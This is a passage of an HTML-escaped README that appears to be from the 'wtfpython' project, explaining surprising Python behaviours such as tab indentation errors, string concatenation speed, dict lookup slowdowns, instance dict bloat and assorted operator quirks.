class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; square(10)&#xA;10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Shouldn&#39;t that be 100?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If you&#39;re not able to reproduce this, try running the file &lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/mixed_tabs_and_spaces.py&#34;&gt;mixed_tabs_and_spaces.py&lt;/a&gt; via the shell.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Don&#39;t mix tabs and spaces!&lt;/strong&gt; The character just preceding return is a &#34;tab&#34;, and the code is indented by multiple of &#34;4 spaces&#34; elsewhere in the example.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;This is how Python handles tabs:&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;First, tabs are replaced (from left to right) by one to eight spaces such that the total number of characters up to and including the replacement is a multiple of eight &amp;lt;...&amp;gt;&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So the &#34;tab&#34; at the last line of &lt;code&gt;square&lt;/code&gt; function is replaced with eight spaces, and it gets into the loop.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python 3 is kind enough to throw an error for such cases automatically.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;TabError: inconsistent use of tabs and spaces in indentation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Miscellaneous&lt;/h2&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;+=&lt;/code&gt; is faster&lt;/h3&gt; &#xA;&lt;!-- Example ID: bfd19c60-a807-4a26-9598-4912b86ddb36 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# using &#34;+&#34;, three strings:&#xA;&amp;gt;&amp;gt;&amp;gt; timeit.timeit(&#34;s1 = s1 + s2 + s3&#34;, setup=&#34;s1 = &#39; &#39; * 100000; s2 = &#39; &#39; * 100000; s3 = &#39; &#39; * 100000&#34;, number=100)&#xA;0.25748300552368164&#xA;# using &#34;+=&#34;, three strings:&#xA;&amp;gt;&amp;gt;&amp;gt; timeit.timeit(&#34;s1 += s2 + s3&#34;, setup=&#34;s1 = &#39; &#39; * 100000; s2 = &#39; &#39; * 100000; s3 = &#39; &#39; * 100000&#34;, number=100)&#xA;0.012188911437988281&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;+=&lt;/code&gt; is faster than &lt;code&gt;+&lt;/code&gt; for concatenating more than two strings because the first string (example, &lt;code&gt;s1&lt;/code&gt; for &lt;code&gt;s1 += s2 + s3&lt;/code&gt;) is not destroyed while calculating the complete string.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s make a giant string!&lt;/h3&gt; &#xA;&lt;!-- Example ID: c7a07424-63fe-4504-9842-8f3d334f28fc ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def add_string_with_plus(iters):&#xA;    s = &#34;&#34;&#xA;    for i in range(iters):&#xA;        s += &#34;xyz&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_bytes_with_plus(iters):&#xA;    s = b&#34;&#34;&#xA;    for i in range(iters):&#xA;        s += b&#34;xyz&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_string_with_format(iters):&#xA;    fs = &#34;{}&#34;*iters&#xA;    s = fs.format(*([&#34;xyz&#34;]*iters))&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_string_with_join(iters):&#xA;    l = []&#xA;    for i in range(iters):&#xA;        l.append(&#34;xyz&#34;)&#xA;    s = &#34;&#34;.join(l)&#xA;    assert len(s) == 3*iters&#xA;&#xA;def convert_list_to_string(l, iters):&#xA;    s = &#34;&#34;.join(l)&#xA;    assert len(s) == 3*iters&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Executed in ipython shell using %timeit for better readability of results.&#xA;# You can also use the timeit module in normal python shell/scriptm=, example usage below&#xA;# timeit.timeit(&#39;add_string_with_plus(10000)&#39;, number=1000, globals=globals())&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; NUM_ITERS = 1000&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_plus(NUM_ITERS)&#xA;124 µs ± 4.73 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_bytes_with_plus(NUM_ITERS)&#xA;211 µs ± 10.5 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_format(NUM_ITERS)&#xA;61 µs ± 2.18 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_join(NUM_ITERS)&#xA;117 µs ± 3.21 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; l = [&#34;xyz&#34;]*NUM_ITERS&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 convert_list_to_string(l, NUM_ITERS)&#xA;10.1 µs ± 1.06 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s increase the number of iterations by a factor of 10.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; NUM_ITERS = 10000&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_plus(NUM_ITERS) # Linear increase in execution time&#xA;1.26 ms ± 76.8 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_bytes_with_plus(NUM_ITERS) # Quadratic increase&#xA;6.82 ms ± 134 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_format(NUM_ITERS) # Linear increase&#xA;645 µs ± 24.5 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_join(NUM_ITERS) # Linear increase&#xA;1.17 ms ± 7.25 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; l = [&#34;xyz&#34;]*NUM_ITERS&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 convert_list_to_string(l, NUM_ITERS) # Linear increase&#xA;86.3 µs ± 2 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;You can read more about &lt;a href=&#34;https://docs.python.org/3/library/timeit.html&#34;&gt;timeit&lt;/a&gt; or &lt;a href=&#34;https://ipython.org/ipython-doc/dev/interactive/magics.html#magic-timeit&#34;&gt;%timeit&lt;/a&gt; on these links. They are used to measure the execution time of code pieces.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Don&#39;t use &lt;code&gt;+&lt;/code&gt; for generating long strings — In Python, &lt;code&gt;str&lt;/code&gt; is immutable, so the left and right strings have to be copied into the new string for every pair of concatenations. If you concatenate four strings of length 10, you&#39;ll be copying (10+10) + ((10+10)+10) + (((10+10)+10)+10) = 90 characters instead of just 40 characters. Things get quadratically worse as the number and size of the string increases (justified with the execution times of &lt;code&gt;add_bytes_with_plus&lt;/code&gt; function)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Therefore, it&#39;s advised to use &lt;code&gt;.format.&lt;/code&gt; or &lt;code&gt;%&lt;/code&gt; syntax (however, they are slightly slower than &lt;code&gt;+&lt;/code&gt; for very short strings).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Or better, if already you&#39;ve contents available in the form of an iterable object, then use &lt;code&gt;&#39;&#39;.join(iterable_object)&lt;/code&gt; which is much faster.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Unlike &lt;code&gt;add_bytes_with_plus&lt;/code&gt; because of the &lt;code&gt;+=&lt;/code&gt; optimizations discussed in the previous example, &lt;code&gt;add_string_with_plus&lt;/code&gt; didn&#39;t show a quadratic increase in execution time. Had the statement been &lt;code&gt;s = s + &#34;x&#34; + &#34;y&#34; + &#34;z&#34;&lt;/code&gt; instead of &lt;code&gt;s += &#34;xyz&#34;&lt;/code&gt;, the increase would have been quadratic.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def add_string_with_plus(iters):&#xA;    s = &#34;&#34;&#xA;    for i in range(iters):&#xA;        s = s + &#34;x&#34; + &#34;y&#34; + &#34;z&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n100 add_string_with_plus(1000)&#xA;388 µs ± 22.4 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n100 add_string_with_plus(10000) # Quadratic increase in execution time&#xA;9 ms ± 298 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So many ways to format and create a giant string are somewhat in contrast to the &lt;a href=&#34;https://www.python.org/dev/peps/pep-0020/&#34;&gt;Zen of Python&lt;/a&gt;, according to which,&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;There should be one-- and preferably only one --obvious way to do it.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Slowing down &lt;code&gt;dict&lt;/code&gt; lookups *&lt;/h3&gt; &#xA;&lt;!-- Example ID: c9c26ce6-df0c-47f7-af0b-966b9386d4c3 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_dict = {str(i): 1 for i in range(1_000_000)}&#xA;another_dict = {str(i): 1 for i in range(1_000_000)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; %timeit some_dict[&#39;5&#39;]&#xA;28.6 ns ± 0.115 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[1] = 1&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit some_dict[&#39;5&#39;]&#xA;37.2 ns ± 0.265 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit another_dict[&#39;5&#39;]&#xA;28.5 ns ± 0.142 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; another_dict[1]  # Trying to access a key that doesn&#39;t exist&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;KeyError: 1&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit another_dict[&#39;5&#39;]&#xA;38.5 ns ± 0.0913 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why are same lookups becoming slower?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CPython has a generic dictionary lookup function that handles all types of keys (&lt;code&gt;str&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt;, any object ...), and a specialized one for the common case of dictionaries composed of &lt;code&gt;str&lt;/code&gt;-only keys.&lt;/li&gt; &#xA; &lt;li&gt;The specialized function (named &lt;code&gt;lookdict_unicode&lt;/code&gt; in CPython&#39;s &lt;a href=&#34;https://github.com/python/cpython/raw/522691c46e2ae51faaad5bbbce7d959dd61770df/Objects/dictobject.c#L841&#34;&gt;source&lt;/a&gt;) knows all existing keys (including the looked-up key) are strings, and uses the faster &amp;amp; simpler string comparison to compare keys, instead of calling the &lt;code&gt;__eq__&lt;/code&gt; method.&lt;/li&gt; &#xA; &lt;li&gt;The first time a &lt;code&gt;dict&lt;/code&gt; instance is accessed with a non-&lt;code&gt;str&lt;/code&gt; key, it&#39;s modified so future lookups use the generic function.&lt;/li&gt; &#xA; &lt;li&gt;This process is not reversible for the particular &lt;code&gt;dict&lt;/code&gt; instance, and the key doesn&#39;t even have to exist in the dictionary. That&#39;s why attempting a failed lookup has the same effect.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ Bloating instance &lt;code&gt;dict&lt;/code&gt;s *&lt;/h3&gt; &#xA;&lt;!-- Example ID: fe706ab4-1615-c0ba-a078-76c98cbe3f48 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import sys&#xA;&#xA;class SomeClass:&#xA;    def __init__(self):&#xA;        self.some_attr1 = 1&#xA;        self.some_attr2 = 2&#xA;        self.some_attr3 = 3&#xA;        self.some_attr4 = 4&#xA;&#xA;&#xA;def dict_size(o):&#xA;    return sys.getsizeof(o.__dict__)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; (Python 3.8, other Python 3 versions may vary a little)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; o2 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;104&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o2)&#xA;104&#xA;&amp;gt;&amp;gt;&amp;gt; del o1.some_attr1&#xA;&amp;gt;&amp;gt;&amp;gt; o3 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o3)&#xA;232&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;232&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s try again... In a new interpreter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; o2 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;104  # as expected&#xA;&amp;gt;&amp;gt;&amp;gt; o1.some_attr5 = 5&#xA;&amp;gt;&amp;gt;&amp;gt; o1.some_attr6 = 6&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;360&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o2)&#xA;272&#xA;&amp;gt;&amp;gt;&amp;gt; o3 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o3)&#xA;232&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;What makes those dictionaries become bloated? And why are newly created objects bloated as well?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CPython is able to reuse the same &#34;keys&#34; object in multiple dictionaries. This was added in &lt;a href=&#34;https://www.python.org/dev/peps/pep-0412/&#34;&gt;PEP 412&lt;/a&gt; with the motivation to reduce memory usage, specifically in dictionaries of instances - where keys (instance attributes) tend to be common to all instances.&lt;/li&gt; &#xA; &lt;li&gt;This optimization is entirely seamless for instance dictionaries, but it is disabled if certain assumptions are broken.&lt;/li&gt; &#xA; &lt;li&gt;Key-sharing dictionaries do not support deletion; if an instance attribute is deleted, the dictionary is &#34;unshared&#34;, and key-sharing is disabled for all future instances of the same class.&lt;/li&gt; &#xA; &lt;li&gt;Additionaly, if the dictionary keys have been resized (because new keys are inserted), they are kept shared &lt;em&gt;only&lt;/em&gt; if they are used by a exactly single dictionary (this allows adding many attributes in the &lt;code&gt;__init__&lt;/code&gt; of the very first created instance, without causing an &#34;unshare&#34;). If multiple instances exist when a resize happens, key-sharing is disabled for all future instances of the same class: CPython can&#39;t tell if your instances are using the same set of attributes anymore, and decides to bail out on attempting to share their keys.&lt;/li&gt; &#xA; &lt;li&gt;A small tip, if you aim to lower your program&#39;s memory footprint: don&#39;t delete instance attributes, and make sure to initialize all attributes in your &lt;code&gt;__init__&lt;/code&gt;!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ Minor Ones *&lt;/h3&gt; &#xA;&lt;!-- Example ID: f885cb82-f1e4-4daa-9ff3-972b14cb1324 ---&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;join()&lt;/code&gt; is a string operation instead of list operation. (sort of counter-intuitive at first usage)&lt;/p&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; If &lt;code&gt;join()&lt;/code&gt; is a method on a string, then it can operate on any iterable (list, tuple, iterators). If it were a method on a list, it&#39;d have to be implemented separately by every type. Also, it doesn&#39;t make much sense to put a string-specific method on a generic &lt;code&gt;list&lt;/code&gt; object API.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Few weird looking but semantically correct statements:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;[] = ()&lt;/code&gt; is a semantically correct statement (unpacking an empty &lt;code&gt;tuple&lt;/code&gt; into an empty &lt;code&gt;list&lt;/code&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;&#39;a&#39;[0][0][0][0][0]&lt;/code&gt; is also a semantically correct statement as strings are &lt;a href=&#34;https://docs.python.org/3/glossary.html#term-sequence&#34;&gt;sequences&lt;/a&gt;(iterables supporting element access using integer indices) in Python.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;3 --0-- 5 == 8&lt;/code&gt; and &lt;code&gt;--5 == 5&lt;/code&gt; are both semantically correct statements and evaluate to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Given that &lt;code&gt;a&lt;/code&gt; is a number, &lt;code&gt;++a&lt;/code&gt; and &lt;code&gt;--a&lt;/code&gt; are both valid Python statements but don&#39;t behave the same way as compared with similar statements in languages like C, C++, or Java.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 5&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; ++a&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; --a&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;There is no &lt;code&gt;++&lt;/code&gt; operator in Python grammar. It is actually two &lt;code&gt;+&lt;/code&gt; operators.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;++a&lt;/code&gt; parses as &lt;code&gt;+(+a)&lt;/code&gt; which translates to &lt;code&gt;a&lt;/code&gt;. Similarly, the output of the statement &lt;code&gt;--a&lt;/code&gt; can be justified.&lt;/li&gt; &#xA;   &lt;li&gt;This StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/3654830/why-are-there-no-and-operators-in-python&#34;&gt;thread&lt;/a&gt; discusses the rationale behind the absence of increment and decrement operators in Python.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You must be aware of the Walrus operator in Python. But have you ever heard about &lt;em&gt;the space-invader operator&lt;/em&gt;?&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 42&#xA;&amp;gt;&amp;gt;&amp;gt; a -=- 1&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;43&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;It is used as an alternative incrementation operator, together with another one&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a +=+ 1&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&amp;gt;&amp;gt;&amp;gt; 44&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; This prank comes from &lt;a href=&#34;https://twitter.com/raymondh/status/1131103570856632321?lang=en&#34;&gt;Raymond Hettinger&#39;s tweet&lt;/a&gt;. The space invader operator is actually just a malformatted &lt;code&gt;a -= (-1)&lt;/code&gt;. Which is equivalent to &lt;code&gt;a = a - (- 1)&lt;/code&gt;. Similar for the &lt;code&gt;a += (+ 1)&lt;/code&gt; case.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python has an undocumented &lt;a href=&#34;https://en.wikipedia.org/wiki/Converse_implication&#34;&gt;converse implication&lt;/a&gt; operator.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; False ** False == True&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; False ** True == False&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; True ** False == True&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; True ** True == True&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; If you replace &lt;code&gt;False&lt;/code&gt; and &lt;code&gt;True&lt;/code&gt; by 0 and 1 and do the maths, the truth table is equivalent to a converse implication operator. (&lt;a href=&#34;https://github.com/cosmologicon/pywat/raw/master/explanation.md#the-undocumented-converse-implication-operator&#34;&gt;Source&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since we are talking operators, there&#39;s also &lt;code&gt;@&lt;/code&gt; operator for matrix multiplication (don&#39;t worry, this time it&#39;s for real).&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import numpy as np&#xA;&amp;gt;&amp;gt;&amp;gt; np.array([2, 2, 2]) @ np.array([7, 8, 8])&#xA;46&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; The &lt;code&gt;@&lt;/code&gt; operator was added in Python 3.5 keeping the scientific community in mind. Any object can overload &lt;code&gt;__matmul__&lt;/code&gt; magic method to define behavior for this operator.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;From Python 3.8 onwards you can use a typical f-string syntax like &lt;code&gt;f&#39;{some_var=}&lt;/code&gt; for quick debugging. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_string = &#34;wtfpython&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; f&#39;{some_string=}&#39;&#xA;&#34;some_string=&#39;wtfpython&#39;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python uses 2 bytes for local variable storage in functions. In theory, this means that only 65536 variables can be defined in a function. However, python has a handy solution built in that can be used to store more than 2^16 variable names. The following code demonstrates what happens in the stack when more than 65536 local variables are defined (Warning: This code prints around 2^18 lines of text, so be prepared!):&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import dis&#xA;exec(&#34;&#34;&#34;&#xA;def f():&#xA;   &#34;&#34;&#34; + &#34;&#34;&#34;&#xA;   &#34;&#34;&#34;.join([&#34;X&#34; + str(x) + &#34;=&#34; + str(x) for x in range(65539)]))&#xA;&#xA;f()&#xA;&#xA;print(dis.dis(f))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Multiple Python threads won&#39;t run your &lt;em&gt;Python code&lt;/em&gt; concurrently (yes, you heard it right!). It may seem intuitive to spawn several threads and let them execute your Python code concurrently, but, because of the &lt;a href=&#34;https://wiki.python.org/moin/GlobalInterpreterLock&#34;&gt;Global Interpreter Lock&lt;/a&gt; in Python, all you&#39;re doing is making your threads execute on the same core turn by turn. Python threads are good for IO-bound tasks, but to achieve actual parallelization in Python for CPU-bound tasks, you might want to use the Python &lt;a href=&#34;https://docs.python.org/3/library/multiprocessing.html&#34;&gt;multiprocessing&lt;/a&gt; module.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sometimes, the &lt;code&gt;print&lt;/code&gt; method might not print values immediately. For example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# File some_file.py&#xA;import time&#xA;&#xA;print(&#34;wtfpython&#34;, end=&#34;_&#34;)&#xA;time.sleep(3)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This will print the &lt;code&gt;wtfpython&lt;/code&gt; after 3 seconds due to the &lt;code&gt;end&lt;/code&gt; argument because the output buffer is flushed either after encountering &lt;code&gt;\n&lt;/code&gt; or when the program finishes execution. We can force the buffer to flush by passing &lt;code&gt;flush=True&lt;/code&gt; argument.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;List slicing with out of the bounds indices throws no errors&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4, 5]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[111:]&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Slicing an iterable not always creates a new object. For example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_str = &#34;wtfpython&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_list = [&#39;w&#39;, &#39;t&#39;, &#39;f&#39;, &#39;p&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list is some_list[:] # False expected because a new object is created.&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; some_str is some_str[:] # True because strings are immutable, so making a new object is of not much use.&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;int(&#39;١٢٣٤٥٦٧٨٩&#39;)&lt;/code&gt; returns &lt;code&gt;123456789&lt;/code&gt; in Python 3. In Python, Decimal characters include digit characters, and all characters that can be used to form decimal-radix numbers, e.g. U+0660, ARABIC-INDIC DIGIT ZERO. Here&#39;s an &lt;a href=&#34;https://chris.improbable.org/2014/8/25/adventures-in-unicode-digits/&#34;&gt;interesting story&lt;/a&gt; related to this behavior of Python.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can separate numeric literals with underscores (for better readability) from Python 3 onwards.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; six_million = 6_000_000&#xA;&amp;gt;&amp;gt;&amp;gt; six_million&#xA;6000000&#xA;&amp;gt;&amp;gt;&amp;gt; hex_address = 0xF00D_CAFE&#xA;&amp;gt;&amp;gt;&amp;gt; hex_address&#xA;4027435774&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;&#39;abc&#39;.count(&#39;&#39;) == 4&lt;/code&gt;. Here&#39;s an approximate implementation of &lt;code&gt;count&lt;/code&gt; method, which would make the things more clear&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def count(s, sub):&#xA;    result = 0&#xA;    for i in range(len(s) + 1 - len(sub)):&#xA;        result += (s[i:i + len(sub)] == sub)&#xA;    return result&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The behavior is due to the matching of empty substring(&lt;code&gt;&#39;&#39;&lt;/code&gt;) with slices of length 0 in the original string.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; 